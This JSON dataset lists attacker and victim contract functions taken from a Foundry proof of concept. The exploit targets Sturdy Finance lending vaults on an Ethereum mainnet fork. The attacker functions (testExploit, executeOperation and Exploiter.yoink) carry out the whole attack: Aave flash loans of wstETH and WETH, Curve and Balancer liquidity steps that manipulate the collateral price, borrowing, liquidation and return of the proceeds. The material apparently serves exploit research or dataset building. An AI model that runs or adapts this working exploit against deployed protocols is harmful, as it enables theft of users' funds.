[
  {
    "contract/interface": "ILPVault",
    "source_type": "victim_contract",
    "function_name": "depositCollateralFrom",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILPVault",
    "source_type": "victim_contract",
    "function_name": "withdrawCollateral",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        WETH.withdraw(1100 ether);\n        uint256[2] memory amount;\n        amount[0] = 1100 ether;\n        amount[1] = 0;\n        console.log(\"2. Add 1,100 ETH to steCRV pool to mint 1,023 steCRV.\");\n        LidoCurvePool.add_liquidity{value: 1100 ether}(amount, 1000 ether); // Add 1,100 ETH to steCRV pool to mint 1,023 steCRV.\n\n        for (uint256 i; i < 1; i++) {\n            Exploiter exploiter = new Exploiter();\n            vm.label(address(exploiter), \"exploiter\");\n            WETH.transfer(address(exploiter), WETH.balanceOf(address(this)));\n            wstETH.transfer(address(exploiter), wstETH.balanceOf(address(this)));\n            steCRV.transfer(address(exploiter), steCRV.balanceOf(address(this)));\n            exploiter.yoink();\n        }\n\n        LidoCurvePool.remove_liquidity_one_coin(steCRV.balanceOf(address(this)), 0, 1000 * 1e18); // burn steCRV, get WETH\n        wstETH.unwrap(wstETH.balanceOf(address(this)) - amounts[0] - premiums[0]); // burn redundant wstETH, get WETH\n        stETH.approve(address(LidoCurvePool), stETH.balanceOf(address(this)));\n        LidoCurvePool.exchange(1, 0, stETH.balanceOf(address(this)), 1); // swap stETH to ETH\n        WETH.deposit{value: address(this).balance}();\n\n        IERC20(assets[0]).approve(address(aaveV3), amounts[0] + premiums[0]);\n        IERC20(assets[1]).approve(address(aaveV3), amounts[1] + premiums[1]);\n\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 17_460_609);\n        vm.label(address(wstETH), \"wstETH\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(steCRV), \"steCRV\");\n        vm.label(address(stETH), \"stETH\");\n        vm.label(address(B_STETH_STABLE), \"B_STETH_STABLE\");\n        vm.label(address(LidoCurvePool), \"LidoCurvePool\");\n        vm.label(address(lendingPool), \"lendingPool\");\n        vm.label(address(AuraBalancerLPVault), \"AuraBalancerLPVault\");\n        vm.label(address(ConvexCurveLPVault2), \"ConvexCurveLPVault2\");\n        vm.label(address(Balancer), \"Balancer\");\n        vm.label(address(aaveV3), \"aaveV3\");\n        vm.label(address(BalancerQueries), \"BalancerQueries\");\n        vm.label(address(SturdyOracle), \"SturdyOracle\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(this), 0);\n        address[] memory assets = new address[](2);\n        assets[0] = address(wstETH);\n        assets[1] = address(WETH);\n        uint256[] memory amounts = new uint256[](2);\n        amounts[0] = 50_000 * 1e18;\n        amounts[1] = 60_000 * 1e18;\n        uint256[] memory modes = new uint256[](2);\n        modes[0] = 0;\n        modes[1] = 0;\n        console.log(\"1. Borrow 50,000 wstETH and 60,000 WETH from Aave as a flashloan.\");\n        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), \"\", 0); // Borrow 50,000 wstETH and 60,000 WETH from Aave as a flashloan.\n\n        emit log_named_decimal_uint(\n            \"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LendingPool",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LendingPool",
    "source_type": "victim_contract",
    "function_name": "getUserAccountData",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LendingPool",
    "source_type": "victim_contract",
    "function_name": "liquidationCall",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LendingPool",
    "source_type": "victim_contract",
    "function_name": "setUserUseReserveAsCollateral",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IBalancerQueries",
    "source_type": "victim_contract",
    "function_name": "queryExit",
    "original_code": "    function queryExit(\n        bytes32 poolId,\n        address sender,\n        address recipient,\n        uint256[] memory balances,\n        uint256 lastChangeBlock,\n        uint256 protocolSwapFeePercentage,\n        bytes memory userData\n    ) external returns (uint256 bptIn, uint256[] memory amountsOut) {\n        InputHelpers.ensureInputLengthMatch(balances.length, _getTotalTokens());\n\n        _queryAction(\n            poolId,\n            sender,\n            recipient,\n            balances,\n            lastChangeBlock,\n            protocolSwapFeePercentage,\n            userData,\n            _onExitPool,\n            _downscaleDownArray\n        );\n\n        // The `return` opcode is executed directly inside `_queryAction`, so execution never reaches this statement,\n        // and we don't need to return anything here - it just silences compiler warnings.\n        return (bptIn, amountsOut);\n    }\n\n    // Internal hooks to be overridden by derived contracts - all token amounts (except BPT) in these interfaces are\n    // upscaled.\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBalancerQueries",
    "source_type": "victim_contract",
    "function_name": "queryJoin",
    "original_code": "    function queryJoin(\n        bytes32 poolId,\n        address sender,\n        address recipient,\n        uint256[] memory balances,\n        uint256 lastChangeBlock,\n        uint256 protocolSwapFeePercentage,\n        bytes memory userData\n    ) external returns (uint256 bptOut, uint256[] memory amountsIn) {\n        InputHelpers.ensureInputLengthMatch(balances.length, _getTotalTokens());\n\n        _queryAction(\n            poolId,\n            sender,\n            recipient,\n            balances,\n            lastChangeBlock,\n            protocolSwapFeePercentage,\n            userData,\n            _onJoinPool,\n            _downscaleUpArray\n        );\n\n        // The `return` opcode is executed directly inside `_queryAction`, so execution never reaches this statement,\n        // and we don't need to return anything here - it just silences compiler warnings.\n        return (bptOut, amountsIn);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IwstETH",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IwstETH",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IwstETH",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IwstETH",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IwstETH",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n        Deposit(msg.sender, msg.value);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IwstETH",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IwstETH",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "  function owner() public view returns (address) {\n    return _owner;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IwstETH",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IwstETH",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IwstETH",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IwstETH",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IwstETH",
    "source_type": "victim_contract",
    "function_name": "unwrap",
    "original_code": "    function unwrap(uint256 _wstETHAmount) external returns (uint256) {\n        require(_wstETHAmount > 0, \"wstETH: zero amount unwrap not allowed\");\n        uint256 stETHAmount = stETH.getPooledEthByShares(_wstETHAmount);\n        _burn(msg.sender, _wstETHAmount);\n        stETH.transfer(msg.sender, stETHAmount);\n        return stETHAmount;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IwstETH",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        msg.sender.transfer(wad);\n        Withdrawal(msg.sender, wad);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISturdyOracle",
    "source_type": "victim_contract",
    "function_name": "getAssetPrice",
    "original_code": "  function getAssetPrice(address asset) public view override returns (uint256) {\n    address source = assetsSources[asset];\n\n    if (asset == BASE_CURRENCY) {\n      return BASE_CURRENCY_UNIT;\n    } else if (source == address(0)) {\n      return _fallbackOracle.getAssetPrice(asset);\n    } else {\n      int256 price = IChainlinkAggregator(source).latestAnswer();\n      if (price > 0) {\n        return uint256(price);\n      } else {\n        return _fallbackOracle.getAssetPrice(asset);\n      }\n    }\n  }\n\n  /// @notice Gets a list of prices from a list of assets addresses\n  /// @param assets The list of assets addresses\n",
    "description": ""
  },
  {
    "contract/interface": "IMetaStablePool",
    "source_type": "victim_contract",
    "function_name": "getPoolId",
    "original_code": "    function getPoolId() public view override returns (bytes32) {\n        return _poolId;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploiter",
    "source_type": "attacker_contract",
    "function_name": "yoink",
    "original_code": "    function yoink() external {\n        joinBalancerPool();\n        depositCollateralAndBorrow();\n        exitBalancerPool();\n        withdrawCollateralAndLiquidation();\n        removeBalancerPoolLiquidity();\n        WETH.deposit{value: address(this).balance}();\n        wstETH.transfer(owner, wstETH.balanceOf(address(this)));\n        WETH.transfer(owner, WETH.balanceOf(address(this)));\n        steCRV.transfer(owner, steCRV.balanceOf(address(this)));\n    }\n\n",
    "description": ""
  }
]